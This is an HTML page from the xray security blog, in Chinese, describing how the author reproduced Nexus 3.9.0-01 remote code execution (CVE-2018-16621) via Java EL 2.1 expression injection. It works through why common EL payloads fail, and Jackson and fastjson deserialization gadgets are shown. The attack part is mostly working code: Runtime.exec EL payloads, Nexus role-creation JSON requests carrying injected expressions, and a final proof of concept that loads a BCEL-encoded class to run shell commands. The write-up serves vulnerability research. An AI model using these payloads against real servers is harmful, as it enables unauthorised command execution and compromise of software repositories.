@@ -1,0 +1,523 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="referrer" content="no-referrer">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>java el 2.1 表达式注入payload(复现上古版本nexus rce) | xray 技术博客</title>
+<link rel="shortcut icon" href="https://blog.xray.cool/favicon.ico?v=1620790014149">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://blog.xray.cool/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="java el 2.1 表达式注入payload(复现上古版本nexus rce) | xray 技术博客 - Atom Feed" href="https://blog.xray.cool/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-176727836-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-176727836-2');
+</script>
+
+
+    <meta name="description" content="简介
+
+https://zh.wikipedia.org/zh/%E7%BB%9F%E4%B8%80%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%AD%E8%A8%80
+
+
+Java统一表达式语言（英語：Unified..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://blog.xray.cool">
+  <img class="avatar" src="https://blog.xray.cool/images/avatar.png?v=1620790014149" alt="">
+  </a>
+  <h1 class="site-title">
+    xray 技术博客
+  </h1>
+  <p class="site-description">
+    
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives/" class="menu">
+          归档
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              java el 2.1 表达式注入payload(复现上古版本nexus rce)
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-09-04
+              </span>
+              <span>
+                18 min read
+              </span>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://blog.xray.cool/post-images/java-el-injection-nexus-rce.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="简介">简介</h2>
+<blockquote>
+<p><a href="https://zh.wikipedia.org/zh/%E7%BB%9F%E4%B8%80%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%AD%E8%A8%80">https://zh.wikipedia.org/zh/%E7%BB%9F%E4%B8%80%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%AD%E8%A8%80</a></p>
+</blockquote>
+<blockquote>
+<p>Java<strong>统一表达式语言</strong>（英語：Unified Expression Language，简称<strong>JUEL</strong>）是一种特殊用途的编程语言，主要在<a href="https://zh.wikipedia.org/wiki/Java">Java</a> <a href="https://zh.wikipedia.org/wiki/Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F">Web应用程序</a>用于将表达式嵌入到web页面。<a href="https://zh.wikipedia.org/wiki/Java">Java</a>规范制定者和Java Web领域技术专家小组制定了统一的表达式语言。JUEL最初包含在<a href="https://zh.wikipedia.org/wiki/JSP">JSP</a> 2.1规范JSR-245中，后来成为Java EE 7的一部分，改在JSR-341中定义。</p>
+</blockquote>
+<h3 id="网上流传的el-表达式注入-poc">网上流传的el 表达式注入 poc</h3>
+<pre><code class="language-java">//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）
+${pageContext}
+
+//获取Web路径
+${pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)}
+
+//文件头参数
+${header}
+
+//获取webRoot
+${applicationScope}
+
+//执行命令
+${pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;).getInputStream())}
+
+${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('calc')}
+
+${''.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec('calc')&quot;)}
+</code></pre>
+<p>构造 远程 rce 有两种方式:</p>
+<ul>
+<li>
+<p>反射 invoke 调用 java.lang.Runtime  exec</p>
+</li>
+<li>
+<p>反射 newInstance 创建javax.script.ScriptEngineManager 脚本引擎</p>
+</li>
+</ul>
+<h3 id="java-el-21复现-nexus3390-01-cve-2018-16621">java el 2.1（复现 nexus3:3.9.0-01     CVE-2018-16621 ）</h3>
+<p><em>以下内容来源于 复现 nexus3:3.9.0-01     CVE-2018-16621  的过程</em></p>
+<p>docker 一行启动 nexus3:3.9.0-01 环境</p>
+<p><code>docker run -d --rm -p 8081:8081 -p 5050:5050 --name nexus -e INSTALL4J_ADD_VM_PARAMS=&quot;-Xms2g -Xmx2g -XX:MaxDirectMemorySize=3g -Djava.util.prefs.userRoot=/nexus-data -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5050&quot; sonatype/nexus3:3.9.0-01</code></p>
+<h3 id="el-21-表达式-不支持-可变参数方法"><em>el 2.1 表达式 不支持 可变参数方法</em></h3>
+<p>上面流传的 payload 其实并不能覆盖全部场景，事实上并不兼容 java el 2.1 的语法；（<strong>上古代码连payload 都跑不通</strong>）</p>
+<p>查询资料的过程中找到一个7年前的问题，有且仅有一个回答。</p>
+<p>No, it is not possible to use variable arguments in EL method expressions, let alone EL functions. Your best bet is to create multiple different named methods with a different amount of fixed arguments.</p>
+<blockquote>
+<p>https://stackoverflow.com/questions/15560508/invoke-method-with-varargs-in-el-throws-java-lang-illegalargumentexception-wron</p>
+</blockquote>
+<p>在复现 sonatype/nexus3:3.9.0-01      版本的 CVE-2018-16621 过程中，发现依赖的el 引擎 javax.el-api/2.2.5  代码中直接忽略了 m.isVarArgs() 情况下的参数构建，</p>
+<p>导致可变参数方法不可传参 <strong>只能 <code>method()</code> 调用</strong></p>
+<pre><code class="language-java">// repository/javax/el/javax.el-api/2.2.5/javax.el-api-2.2.5-sources.jar!/javax/el/BeanELResolver.java    
+private Object invokeMethod(Method m, Object base, Object[] params) {
+
+        Class[] parameterTypes = m.getParameterTypes();
+        Object[] parameters = null;
+        if (parameterTypes.length &gt; 0) {
+            ExpressionFactory exprFactory = getExpressionFactory();
+            if (m.isVarArgs()) {
+                // TODO
+            } else {
+                parameters = new Object[parameterTypes.length];
+                for (int i = 0; i &lt; parameterTypes.length; i++) {
+                    parameters[i] = exprFactory.coerceToType(params[i],
+                                                           parameterTypes[i]);
+                }
+            }
+        }
+        try {
+            return m.invoke(base, parameters);
+        } catch (IllegalAccessException iae) {
+            throw new ELException(iae);
+        } catch (InvocationTargetException ite) {
+            throw new ELException(ite.getCause());
+        }
+    }
+</code></pre>
+<h3 id="复现-rce">复现 rce</h3>
+<p>在当前 nexus3:3.9.0-01 javax.el-api/2.2.5  条件下</p>
+<h4 id="尝试流传的通用payload">尝试流传的通用payload</h4>
+<p><strong>invoke 可变参数</strong> <code>invoke(Object obj, Object... args)</code> 这里显然完全不可用</p>
+<p>只看使用 <code>newInstance()</code> 无参构造出一个 类实例</p>
+<ul>
+<li>
+<p>尝试反射 newInstance 创建javax.script.ScriptEngineManager 脚本引擎</p>
+<pre><code class="language-json">{&quot;action&quot;:&quot;coreui_Role&quot;,&quot;method&quot;:&quot;create&quot;,&quot;data&quot;:[{&quot;version&quot;:&quot;&quot;,&quot;source&quot;:&quot;default&quot;,&quot;id&quot;:&quot;11&quot;,&quot;name&quot;:&quot;1111&quot;,&quot;description&quot;:&quot;1&quot;,&quot;privileges&quot;:[],&quot;roles&quot;:[&quot;${''.class.forName('javax.script.ScriptEngineManager')}&quot;]}],&quot;type&quot;:&quot;rpc&quot;,&quot;tid&quot;:19}
+</code></pre>
+<p>可惜报错找不到 class java.lang.ClassNotFoundException: javax.script.ScriptEngineManager  not found by javax.el-api [93<br>
+<img src="https://blog.xray.cool/post-images/1599472057294.png" alt="" loading="lazy"></p>
+</li>
+</ul>
+<p>目前两条路都断了。。。</p>
+<h4 id="柳暗花明又一村">柳暗花明又一村</h4>
+<p>首先目前el 2.1 表达式可以实现的功能:</p>
+<ul>
+<li>newInstance() 无参构造一个类实例</li>
+<li>调用对象 非可变参数的方法</li>
+</ul>
+<p><strong>仔细想想是不是有点像 java 反序列化的利用链，java 反序列 利用大多是通过创建一个类，在类的构造函数 setter  getter 方法里做文章</strong></p>
+<p>比如 fastjson 的payload<br>
+<code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot; &quot;autoCommit&quot;:true}</code></p>
+<p>这里就是创建了一个<code>com.sun.rowset.JdbcRowSetImpl</code>的对象，依次调用 <code>setDataSourceName</code> 和 <code>setAutoCommit</code> 方法触发<code>lookup jndi</code>，导致 rce</p>
+<p>el 表达式除了只能无参构造类对象外, 能执行的方法可是比反序列更多，理论上大部分反序列的利用链都可以直接使用。</p>
+<p><u>这里最初想直接调用 javax.naming.InitialContext lookup   利用 jndi 的 ，可惜也是 java.lang.ClassNotFoundException</u></p>
+<p>现在寻找rce的路径就变成了，找到一个可用的恶意类，调用触发方法。</p>
+<ul>
+<li>
+<p>寻找 恶意类</p>
+<p>jackson 代码里的恶意 class</p>
+<p>(这里本来想找fastjson 的恶意利用链，可惜fastjson 代码没有明示黑名单,而且黑名单有些没有定位到具体的类，找起来有点麻烦，放弃)</p>
+<blockquote>
+<p>https://github.com/FasterXML/jackson-databind/blob/master/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java</p>
+</blockquote>
+<pre><code class="language-java">static {
+        Set&lt;String&gt; s = new HashSet&lt;String&gt;();
+        // Courtesy of [https://github.com/kantega/notsoserial]:
+        // (and wrt [databind#1599])
+        s.add(&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;);
+        s.add(&quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;);
+        s.add(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;);
+        s.add(&quot;org.apache.commons.collections4.functors.InstantiateTransformer&quot;);
+        s.add(&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;);
+        s.add(&quot;org.codehaus.groovy.runtime.MethodClosure&quot;);
+        s.add(&quot;org.springframework.beans.factory.ObjectFactory&quot;);
+        s.add(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);
+        s.add(&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;);
+        // [databind#1680]: may or may not be problem, take no chance
+        s.add(&quot;com.sun.rowset.JdbcRowSetImpl&quot;);
+        // [databind#1737]; JDK provided
+        s.add(&quot;java.util.logging.FileHandler&quot;);
+        s.add(&quot;java.rmi.server.UnicastRemoteObject&quot;);
+        // [databind#1737]; 3rd party
+//s.add(&quot;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&quot;); // deprecated by [databind#1855]
+        s.add(&quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;);
+        // [databind#2680]
+        s.add(&quot;org.springframework.aop.config.MethodLocatingFactoryBean&quot;);
+        s.add(&quot;org.springframework.beans.factory.config.BeanReferenceFactoryBean&quot;);
+
+// s.add(&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;); // deprecated by [databind#1931]
+// s.add(&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;); // - &quot;&quot; -
+        // [databind#1855]: more 3rd party
+        s.add(&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;);
+        s.add(&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;);
+        // [databind#1899]: more 3rd party
+        s.add(&quot;org.hibernate.jmx.StatisticsService&quot;);
+        s.add(&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;);
+        // [databind#2032]: more 3rd party; data exfiltration via xml parsed ext entities
+        s.add(&quot;org.apache.ibatis.parsing.XPathParser&quot;);
+
+        // [databind#2052]: Jodd-db, with jndi/ldap lookup
+        s.add(&quot;jodd.db.connection.DataSourceConnectionProvider&quot;);
+
+        // [databind#2058]: Oracle JDBC driver, with jndi/ldap lookup
+        s.add(&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;);
+        s.add(&quot;oracle.jdbc.rowset.OracleJDBCRowSet&quot;);
+
+        // [databind#2097]: some 3rd party, one JDK-bundled
+        s.add(&quot;org.slf4j.ext.EventData&quot;);
+        s.add(&quot;flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor&quot;);
+        s.add(&quot;com.sun.deploy.security.ruleset.DRSHelper&quot;);
+        s.add(&quot;org.apache.axis2.jaxws.spi.handler.HandlerResolverImpl&quot;);
+
+        // [databind#2186], [databind#2670]: yet more 3rd party gadgets
+        s.add(&quot;org.jboss.util.propertyeditor.DocumentEditor&quot;);
+        s.add(&quot;org.apache.openjpa.ee.RegistryManagedRuntime&quot;);
+        s.add(&quot;org.apache.openjpa.ee.JNDIManagedRuntime&quot;);
+        s.add(&quot;org.apache.openjpa.ee.WASRegistryManagedRuntime&quot;); // [#2670] addition
+        s.add(&quot;org.apache.axis2.transport.jms.JMSOutTransportInfo&quot;);
+
+        // [databind#2326] (2.9.9)
+        s.add(&quot;com.mysql.cj.jdbc.admin.MiniAdmin&quot;);
+
+        // [databind#2334]: logback-core (2.9.9.1)
+        s.add(&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;);
+
+        // [databind#2341]: jdom/jdom2 (2.9.9.1)
+        s.add(&quot;org.jdom.transform.XSLTransformer&quot;);
+        s.add(&quot;org.jdom2.transform.XSLTransformer&quot;);
+
+        // [databind#2387], [databind#2460]: EHCache
+        s.add(&quot;net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup&quot;);
+        s.add(&quot;net.sf.ehcache.hibernate.EhcacheJtaTransactionManagerLookup&quot;);
+
+        // [databind#2389]: logback/jndi
+        s.add(&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;);
+
+        // [databind#2410]: HikariCP/metricRegistry config
+        s.add(&quot;com.zaxxer.hikari.HikariConfig&quot;);
+        // [databind#2449]: and sub-class thereof
+        s.add(&quot;com.zaxxer.hikari.HikariDataSource&quot;);
+
+        // [databind#2420]: CXF/JAX-RS provider/XSLT
+        s.add(&quot;org.apache.cxf.jaxrs.provider.XSLTJaxbProvider&quot;);
+
+        // [databind#2462]: commons-configuration / -2
+        s.add(&quot;org.apache.commons.configuration.JNDIConfiguration&quot;);
+        s.add(&quot;org.apache.commons.configuration2.JNDIConfiguration&quot;);
+
+        // [databind#2469]: xalan
+        s.add(&quot;org.apache.xalan.lib.sql.JNDIConnectionPool&quot;);
+        // [databind#2704]: xalan2
+        s.add(&quot;com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool&quot;);
+
+        // [databind#2478]: comons-dbcp, p6spy
+        s.add(&quot;org.apache.commons.dbcp.datasources.PerUserPoolDataSource&quot;);
+        s.add(&quot;org.apache.commons.dbcp.datasources.SharedPoolDataSource&quot;);
+        s.add(&quot;com.p6spy.engine.spy.P6DataSource&quot;);
+
+        // [databind#2498]: log4j-extras (1.2)
+        s.add(&quot;org.apache.log4j.receivers.db.DriverManagerConnectionSource&quot;);
+        s.add(&quot;org.apache.log4j.receivers.db.JNDIConnectionSource&quot;);
+
+        // [databind#2526]: some more ehcache
+        s.add(&quot;net.sf.ehcache.transaction.manager.selector.GenericJndiSelector&quot;);
+        s.add(&quot;net.sf.ehcache.transaction.manager.selector.GlassfishSelector&quot;);
+
+        // [databind#2620]: xbean-reflect
+        s.add(&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;);
+
+        // [databind#2631]: shaded hikari-config
+        s.add(&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;);
+
+        // [databind#2634]: ibatis-sqlmap, anteros-core
+        s.add(&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;);
+        s.add(&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;);
+
+        // [databind#2642]: javax.swing (jdk)
+        s.add(&quot;javax.swing.JEditorPane&quot;);
+
+        // [databind#2648], [databind#2653]: shiro-core
+        s.add(&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;);
+        s.add(&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;);
+
+        // [databind#2658]: ignite-jta (, quartz-core)
+        s.add(&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;);
+        s.add(&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmFactory&quot;);
+        s.add(&quot;org.quartz.utils.JNDIConnectionProvider&quot;);
+
+        // [databind#2659]: aries.transaction.jms
+        s.add(&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;);
+        s.add(&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;);
+
+        // [databind#2660]: caucho-quercus
+        s.add(&quot;com.caucho.config.types.ResourceRef&quot;);
+
+        // [databind#2662]: aoju/bus-proxy
+        s.add(&quot;org.aoju.bus.proxy.provider.RmiProvider&quot;);
+        s.add(&quot;org.aoju.bus.proxy.provider.remoting.RmiProvider&quot;);
+
+        // [databind#2664]: activemq-core, activemq-pool, activemq-pool-jms
+
+        s.add(&quot;org.apache.activemq.ActiveMQConnectionFactory&quot;); // core
+        s.add(&quot;org.apache.activemq.ActiveMQXAConnectionFactory&quot;);
+        s.add(&quot;org.apache.activemq.spring.ActiveMQConnectionFactory&quot;);
+        s.add(&quot;org.apache.activemq.spring.ActiveMQXAConnectionFactory&quot;);
+        s.add(&quot;org.apache.activemq.pool.JcaPooledConnectionFactory&quot;); // pool
+        s.add(&quot;org.apache.activemq.pool.PooledConnectionFactory&quot;);
+        s.add(&quot;org.apache.activemq.pool.XaPooledConnectionFactory&quot;);
+        s.add(&quot;org.apache.activemq.jms.pool.XaPooledConnectionFactory&quot;); // pool-jms
+        s.add(&quot;org.apache.activemq.jms.pool.JcaPooledConnectionFactory&quot;);
+        
+        // [databind#2666]: apache/commons-jms
+        s.add(&quot;org.apache.commons.proxy.provider.remoting.RmiProvider&quot;);
+
+        // [databind#2682]: commons-jelly
+        s.add(&quot;org.apache.commons.jelly.impl.Embedded&quot;);
+
+        // [databind#2688]: apache/drill
+        s.add(&quot;oadd.org.apache.xalan.lib.sql.JNDIConnectionPool&quot;);
+
+        // [databind#2698]: weblogic w/ oracle/aq-jms
+        // (note: dependency not available via Maven Central, but as part of
+        // weblogic installation, possibly fairly old version(s))
+        s.add(&quot;oracle.jms.AQjmsQueueConnectionFactory&quot;);
+        s.add(&quot;oracle.jms.AQjmsXATopicConnectionFactory&quot;);
+        s.add(&quot;oracle.jms.AQjmsTopicConnectionFactory&quot;);
+        s.add(&quot;oracle.jms.AQjmsXAQueueConnectionFactory&quot;);
+        s.add(&quot;oracle.jms.AQjmsXAConnectionFactory&quot;);
+
+        // [databind#2764]: org.jsecurity:
+        s.add(&quot;org.jsecurity.realm.jndi.JndiRealmFactory&quot;);
+
+        // [databind#2798]: com.pastdev.httpcomponents:
+        s.add(&quot;com.pastdev.httpcomponents.configuration.JndiConfiguration&quot;);
+        
+        DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);
+    }
+</code></pre>
+</li>
+<li>
+<p>判断目标环境可以找到的恶意class</p>
+<p>burp intruder 爆破下 判断 class 在目标中是否存在</p>
+<pre><code class="language-json">{&quot;action&quot;:&quot;coreui_Role&quot;,&quot;method&quot;:&quot;create&quot;,&quot;data&quot;:[{&quot;version&quot;:&quot;&quot;,&quot;source&quot;:&quot;default&quot;,&quot;id&quot;:&quot;11&quot;,&quot;name&quot;:&quot;1111&quot;,&quot;description&quot;:&quot;1&quot;,&quot;privileges&quot;:[],&quot;roles&quot;:[&quot;${''.class.forName('$burp intruder here$')}&quot;]}],&quot;type&quot;:&quot;rpc&quot;,&quot;tid&quot;:19}
+</code></pre>
+</li>
+<li>
+<p>com.sun.org.apache.bcel.internal.util.ClassLoader</p>
+</li>
+</ul>
+<p>目标环境 nexus3:3.9.0-01 javax.el-api/2.2.5   可以找到恶意class <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code></p>
+<p>jackson 的payload 是调用 ClassLoader 的 loadClass方法 加载编码后的恶意class 导致rce</p>
+<blockquote>
+<p>https://paper.seebug.org/543/</p>
+</blockquote>
+<p>这里用el 表达式表述就是</p>
+<pre><code class="language-java">${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$evalClass').newInstance()}
+</code></pre>
+<p>到这即完成了全部利用 加载恶意类，触发rce</p>
+<p>最终 poc</p>
+<p>eval.class</p>
+<pre><code class="language-java">
+import java.io.*;
+
+public class eval {
+    public eval() {
+
+    }
+
+    public String exec(String cmd) throws IOException {
+        StringBuilder stringBuilder = new StringBuilder();
+        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
+        String line;
+        while((line = bufferedReader.readLine()) != null) {
+            stringBuilder.append(line).append(&quot;\n&quot;);
+        }
+        String res = stringBuilder.toString();
+        return res;
+    }
+    public static void main(String[] args) {
+    }
+}
+</code></pre>
+<p>加载 eval  类,调用exec 方法</p>
+<pre><code class="language-json">${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$I$7c$m$n_$A$Deval$$class$A$8dT$5bO$TQ$Q$fe$O$ddv$cb$b2$U$u$d7$827$f0$c2B$vU$f1$da$o$m$V$US$c1$80$c14$3em$b7$87$ba$a4$ddm$b6$5b$c2$3f$f2Uc$d2$gI$7c$f4$c1$9f$e2$8fP$e7l$97$5eB$8d$b6$e9$cc93$df$99$f9f$e6$9c$fe$f8$f5$f5$h$80$3bx$a9$60$Y$8b2$e2$K$fa$84$5e$92$91P$b0$8c$a4$Q$b7$VB$dcU$Q$c4$8a$C$J$f7$84$b8$_$80$P$c2x$u$f4$p$Z$8fe$a4$YB$ab$a6e$bak$M$Bm$e1$90A$ca$d8$F$ce0$945$z$be$5b$x$e7$b9$f3F$cf$97$c8$S$cd$da$86$5e$3a$d4$jS$ec$7d$a3$e4$be7$ab$U$p$cbO$f4R$9a$f6$fc$94$h$M$b7$b4$ec$b1$7e$a2$tK$baUL$k$b8$8ei$V$d3$L$XM$94$d3$u$XD$e8$k$ae$c1$aa$b7$da$ac$99$a5$Cw$Yb$X$40$be$8b$b0$91$7c$ed$e8$88$3b$bc$b0$cfu$P$3c$d5$E$9bvr$b3$cb$p$u$96$a82$ca$ecp$o$ael$9d$g$bc$e2$9a$b6U$95$n$9ce$dd$b4$Y$s$b4w$3d$K$Q$dd$d1$9d$o$j$h$ed$e1$a6$60$Hv$cd1$f8$b6$v$3a$d3$_$3a$b2$yP$wF$Qe$98$fc$L$7d$ca$d6$9b$x$95$7c$ee$d8$b1$w5$97Nq$bd$dc$f4$c9XU$f1$Ek$w$a6$b0$$cC$c5Sl$8aD$Z$n$9e$a9$d8$c2$b6$8a$e7x$c1$c0$U$V$3b$d8$W$b3$nF$M$c3m$k$7b$f9cn$b8TN$x$cf$5e$ab$l$M$pm$e0$7e$cdr$cd2U$a5$U$b9$db$da$8ck$9d3$f5$cd$d4$87$f9$7fL$ff$b5c$h$bcZMw$a5$f0$8d4KJ$d1Q$_5$ee$3cMw$p$e8$f8$94$d6$d3$n$G5$dav$f9$93$X$d60$f9$LYo$fecZ$cf$L$Z$d2$x$Vn$d1$9dL$fc$d7$Vn_$c1$b0k7M$98$c5$Q$3dL$f1$J$80$89$d9$93$i$a5$dd$KiF$3a$b8$d8$A$fbD$8b$3e$8c$91$U$8f$91$8c$f4$3ee$8c$d3Jm$820$81I$d2T$qb$84$Q$B$3e$pD_$ms$86$be$5c$D$81Wg$90rg$I$e6$be$m$U$afC$ae$p$dc$40$7f$D$can$a2$8e$81$5cJ$fa$8e$e8RL$aaC$8d$O$92x$fb$e1$f7$cf$a5$3a$o$a9$60$y$f8$b1$95$7e$da$L$a9$m$8c$Bb$3e$888$oH$R$ff$Nb$$$e8$ac5S$fat$c4j$g3D$x$8c4$$$e12E$99$c5$i$ae$e0$wU$ab$91$e7$g$fd$q$3a$j$m$fb$M$951Gg$q$c2_G$3fn$e0$a6$df$8b$b8W$g$3a$fb$Q$f2$Mc$j$3d$a0$ff$R$cc$7bZ$f3P$L$7f$A$f1$e1$81$9c$fb$E$A$A').newInstance().exec('ps')}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://blog.xray.cool/post-images/1599472212803.png" alt="" loading="lazy"></figure>
+<p><u>这里其实 <code>com.sun.rowset.JdbcRowSetImpl</code> 目标环境也可加载，但是 el 2.1 可能还有其他限制，实测中没法创建变量保存生成的对象，这里需要分别调用 setDataSourceName 和 setAutoCommit 就服务实现。</u></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E7%AE%80%E4%BB%8B">简介</a>
+<ul>
+<li><a href="#%E7%BD%91%E4%B8%8A%E6%B5%81%E4%BC%A0%E7%9A%84el-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-poc">网上流传的el 表达式注入 poc</a></li>
+<li><a href="#java-el-21%E5%A4%8D%E7%8E%B0-nexus3390-01-cve-2018-16621">java el 2.1（复现 nexus3:3.9.0-01     CVE-2018-16621 ）</a></li>
+<li><a href="#el-21-%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E4%B8%8D%E6%94%AF%E6%8C%81-%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0%E6%96%B9%E6%B3%95"><em>el 2.1 表达式 不支持 可变参数方法</em></a></li>
+<li><a href="#%E5%A4%8D%E7%8E%B0-rce">复现 rce</a>
+<ul>
+<li><a href="#%E5%B0%9D%E8%AF%95%E6%B5%81%E4%BC%A0%E7%9A%84%E9%80%9A%E7%94%A8payload">尝试流传的通用payload</a></li>
+<li><a href="#%E6%9F%B3%E6%9A%97%E8%8A%B1%E6%98%8E%E5%8F%88%E4%B8%80%E6%9D%91">柳暗花明又一村</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://blog.xray.cool/post/learning-redis-security/">
+              <h3 class="post-title">
+                redis安全学习小记
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://blog.xray.cool/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
